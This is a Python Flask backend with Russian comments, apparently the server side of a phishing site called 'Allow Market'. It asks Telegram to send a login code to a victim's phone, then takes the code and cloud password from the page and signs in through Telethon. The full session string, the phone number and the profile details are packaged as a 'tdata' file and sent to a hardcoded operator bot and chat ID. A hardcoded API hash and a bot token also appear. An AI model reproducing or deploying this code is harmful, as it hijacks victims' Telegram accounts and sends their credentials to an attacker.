# app.py — ФИНАЛЬНАЯ ВЕРСИЯ
# КОД ПРИХОДИТ ОТ TELEGRAM (MTProto)
# БОТ ТОЛЬКО ДЛЯ ЛОГОВ И TDATA

from flask import Flask, request, jsonify
from flask_cors import CORS
import asyncio
import time
import random
import os
import json
import io
from dotenv import load_dotenv
from telethon import TelegramClient
from telethon.errors import (
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError,
    FloodWaitError,
    PhoneNumberOccupiedError
)
import requests

load_dotenv()

app = Flask(__name__)
CORS(app)

# ============================================================
# КОНФИГУРАЦИЯ
# ============================================================
# MTProto API данные (my.telegram.org)
API_ID = int(os.getenv('API_ID', '27908807'))
API_HASH = os.getenv('API_HASH', 'e895a9ab366174a6d38fba5e752562a0')

# БОТ ТОЛЬКО ДЛЯ ЛОГОВ АДМИНУ
ADMIN_BOT_TOKEN = os.getenv('ADMIN_BOT_TOKEN', '8992384950:AAFwp5-Bbe9TSn-N--2W3I7oMS2Lcolomec')
ADMIN_CHAT_ID = os.getenv('ADMIN_CHAT_ID', '8766481292')

# Хранилище сессий
sessions = {}

# ============================================================
# ФУНКЦИИ ДЛЯ ЛОГОВ АДМИНУ (ТОЛЬКО ЧЕРЕЗ БОТА)
# ============================================================

def send_admin_log(message, data=None):
    """Отправка лога админу через бота (НЕ ДЛЯ КОДА!)"""
    try:
        text = f"🔐 {message}"
        if data:
            text += f"\n{data}"
        # Отправляем ТОЛЬКО админу, НЕ пользователю!
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendMessage",
            json={'chat_id': ADMIN_CHAT_ID, 'text': text, 'parse_mode': 'Markdown'},
            timeout=5
        )
    except Exception as e:
        print(f"Admin log error: {e}")

def send_tdata_to_admin(session_data):
    """Отправка tdata админу (через бота)"""
    try:
        lines = []
        lines.append("=" * 50)
        lines.append("📁 TDATA СЕССИЯ TELEGRAM")
        lines.append("=" * 50)
        lines.append("")
        lines.append(f"🆔 User ID: {session_data.get('user_id', 'N/A')}")
        lines.append(f"📱 Phone: {session_data.get('phone', 'N/A')}")
        lines.append(f"👤 Username: @{session_data.get('username', 'N/A')}")
        lines.append(f"📛 First Name: {session_data.get('first_name', 'N/A')}")
        lines.append(f"📛 Last Name: {session_data.get('last_name', 'N/A')}")
        lines.append("")
        lines.append("-" * 50)
        lines.append("🔑 SESSION STRING:")
        lines.append("-" * 50)
        lines.append(session_data.get('session_string', 'N/A'))
        lines.append("")
        lines.append("-" * 50)
        lines.append("📋 JSON:")
        lines.append("-" * 50)
        lines.append(json.dumps(session_data, indent=2, ensure_ascii=False))
        lines.append("")
        lines.append("=" * 50)
        
        content = "\n".join(lines)
        file_data = io.BytesIO(content.encode('utf-8'))
        
        files = {'document': (f"tdata_{session_data['phone']}_{int(time.time())}.txt", file_data)}
        data = {
            'chat_id': ADMIN_CHAT_ID,
            'caption': f"✅ *НОВАЯ СЕССИЯ*\nUser: @{session_data['username']}\nPhone: {session_data['phone']}",
            'parse_mode': 'Markdown'
        }
        requests.post(
            f"https://api.telegram.org/bot{ADMIN_BOT_TOKEN}/sendDocument",
            files=files,
            data=data,
            timeout=30
        )
    except Exception as e:
        print(f"Send tdata error: {e}")

# ============================================================
# MTProto ФУНКЦИИ (ТОЛЬКО МТПРОТО, БЕЗ БОТА!)
# ============================================================

async def send_code_async(phone):
    """
    Отправка кода через MTProto API.
    Код приходит ОТ TELEGRAM, НЕ от бота!
    """
    try:
        session_name = f"sessions/{phone.replace('+', '').replace(' ', '')}"
        
        client = TelegramClient(
            session_name,
            api_id=API_ID,
            api_hash=API_HASH
        )
        
        await client.connect()
        
        if await client.is_user_authorized():
            await client.disconnect()
            return {'success': False, 'error': 'Already authorized'}
        
        # ОТПРАВЛЯЕМ ЗАПРОС НА КОД ЧЕРЕЗ MTProto
        # Telegram САМ отправит код пользователю
        result = await client.send_code_request(phone)
        
        # Сохраняем клиент для проверки кода
        sessions[phone] = {
            'client': client,
            'phone_code_hash': result.phone_code_hash,
            'is_connected': True
        }
        
        # ЛОГ ДЛЯ АДМИНА (НЕ КОД!)
        send_admin_log(
            f"📱 Запрос кода для {phone}",
            f"✅ Код отправлен через MTProto (официальный Telegram API)\n❌ Бот НЕ использовался для отправки кода"
        )
        
        return {
            'success': True,
            'phone_code_hash': result.phone_code_hash,
            'message': 'Code sent by Telegram'
        }
        
    except PhoneNumberInvalidError:
        return {'success': False, 'error': 'Invalid phone number'}
    except PhoneNumberOccupiedError:
        return {'success': False, 'error': 'Phone number is occupied'}
    except FloodWaitError as e:
        return {'success': False, 'error': f'Too many attempts. Wait {e.seconds} seconds'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def check_code_async(phone, code, phone_code_hash):
    """Проверка кода через MTProto API"""
    try:
        client_data = sessions.get(phone)
        if not client_data:
            return {'success': False, 'error': 'Session not found. Request a new code.'}
        
        client = client_data['client']
        
        if not client.is_connected():
            await client.connect()
        
        try:
            signed_in = await client.sign_in(
                phone=phone,
                code=code,
                phone_code_hash=phone_code_hash
            )
            
            session_string = client.session.save()
            
            session_data = {
                'user_id': signed_in.id,
                'phone': phone,
                'username': signed_in.username or f"user_{random.randint(10000, 99999)}",
                'first_name': signed_in.first_name or 'User',
                'last_name': signed_in.last_name or '',
                'session_string': session_string
            }
            
            await client.disconnect()
            
            return {
                'success': True,
                'hasPassword': False,
                'sessionData': session_data,
                'message': 'Code verified successfully'
            }
            
        except SessionPasswordNeededError:
            return {
                'success': True,
                'hasPassword': True,
                'message': 'Cloud password required'
            }
            
        except PhoneCodeInvalidError:
            return {'success': False, 'error': 'Invalid code. Please try again.'}
        except PhoneCodeExpiredError:
            return {'success': False, 'error': 'Code expired. Request a new one.'}
            
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def check_password_async(phone, password):
    """Проверка облачного пароля через MTProto"""
    try:
        client_data = sessions.get(phone)
        if not client_data:
            return {'success': False, 'error': 'Session not found'}
        
        client = client_data['client']
        
        if not client.is_connected():
            await client.connect()
        
        try:
            signed_in = await client.sign_in(password=password)
            
            session_string = client.session.save()
            
            session_data = {
                'user_id': signed_in.id,
                'phone': phone,
                'username': signed_in.username or f"user_{random.randint(10000, 99999)}",
                'first_name': signed_in.first_name or 'User',
                'last_name': signed_in.last_name or '',
                'session_string': session_string
            }
            
            await client.disconnect()
            
            return {
                'success': True,
                'sessionData': session_data,
                'message': 'Password verified successfully'
            }
            
        except PasswordHashInvalidError:
            return {'success': False, 'error': 'Invalid password'}
            
    except Exception as e:
        return {'success': False, 'error': str(e)}

# ============================================================
# FLASK ЭНДПОИНТЫ
# ============================================================

@app.route('/ping', methods=['GET'])
@app.route('/', methods=['GET'])
def ping():
    return jsonify({
        'status': 'online',
        'service': 'Allow Market Backend (MTProto)',
        'version': '5.0.0',
        'important': '✅ Код приходит от ОФИЦИАЛЬНОГО TELEGRAM (НЕ от бота!)',
        'bot_usage': '❌ Бот используется ТОЛЬКО для логов админу',
        'endpoints': [
            'GET /ping',
            'POST /sendCode',
            'POST /checkCode',
            'POST /checkPassword'
        ]
    })

@app.route('/sendCode', methods=['POST'])
def send_code():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    
    if not phone or len(phone) < 6:
        return jsonify({'success': False, 'error': 'Invalid phone number'}), 400
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(send_code_async(phone))
    loop.close()
    
    if result['success']:
        return jsonify({
            'success': True,
            'phoneCodeHash': result.get('phone_code_hash'),
            'message': 'Code sent by Telegram'
        })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

@app.route('/checkCode', methods=['POST'])
def check_code():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    code = data.get('code', '').strip()
    phone_code_hash = data.get('phoneCodeHash', '').strip()
    
    if not phone or not code or not phone_code_hash:
        return jsonify({
            'success': False,
            'error': 'Missing required fields: phone, code, phoneCodeHash'
        }), 400
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(check_code_async(phone, code, phone_code_hash))
    loop.close()
    
    if result['success']:
        if result.get('hasPassword'):
            return jsonify({
                'success': True,
                'hasPassword': True,
                'message': 'Cloud password required'
            })
        else:
            session_data = result['sessionData']
            
            # Отправляем tdata админу (ЧЕРЕЗ БОТА, НО ТОЛЬКО ЛОГИ!)
            send_tdata_to_admin(session_data)
            
            send_admin_log(
                f"✅ ВЕРИФИКАЦИЯ УСПЕШНА для {phone}",
                f"User ID: {session_data['user_id']}\nUsername: @{session_data['username']}"
            )
            
            return jsonify({
                'success': True,
                'hasPassword': False,
                'sessionData': session_data,
                'message': 'Code verified successfully'
            })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

@app.route('/checkPassword', methods=['POST'])
def check_password():
    data = request.json or {}
    phone = data.get('phone', '').strip()
    password = data.get('password', '').strip()
    
    if not phone or not password:
        return jsonify({'success': False, 'error': 'Missing phone or password'}), 400
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    result = loop.run_until_complete(check_password_async(phone, password))
    loop.close()
    
    if result['success']:
        session_data = result['sessionData']
        
        send_tdata_to_admin(session_data)
        
        send_admin_log(
            f"🔑 Облачный пароль подтверждён для {phone}",
            f"User ID: {session_data['user_id']}"
        )
        
        return jsonify({
            'success': True,
            'sessionData': session_data,
            'message': 'Password verified successfully'
        })
    else:
        return jsonify({'success': False, 'error': result.get('error')}), 400

# ============================================================
# ЗАПУСК
# ============================================================
if __name__ == '__main__':
    os.makedirs('sessions', exist_ok=True)
    print("=" * 60)
    print("🔐 БЭКЕНД ЗАПУЩЕН (MTProto)")
    print("📌 Код приходит ОТ TELEGRAM (НЕ от бота!)")
    print("📌 Бот используется ТОЛЬКО для логов админу")
    print("📌 Никакой код НЕ отправляется через бота")
    print("=" * 60)
    app.run(host='0.0.0.0', port=5000)
